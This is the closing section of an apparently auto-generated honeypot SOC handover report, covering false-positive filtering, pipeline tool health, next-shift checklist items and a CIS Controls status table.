| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 172 cases |
| Tool 34  | Credential Extractor        | ✅ 343 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 83 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 80 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 126 priority case(s) shown individually · 31 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-14T03:57:48Z_
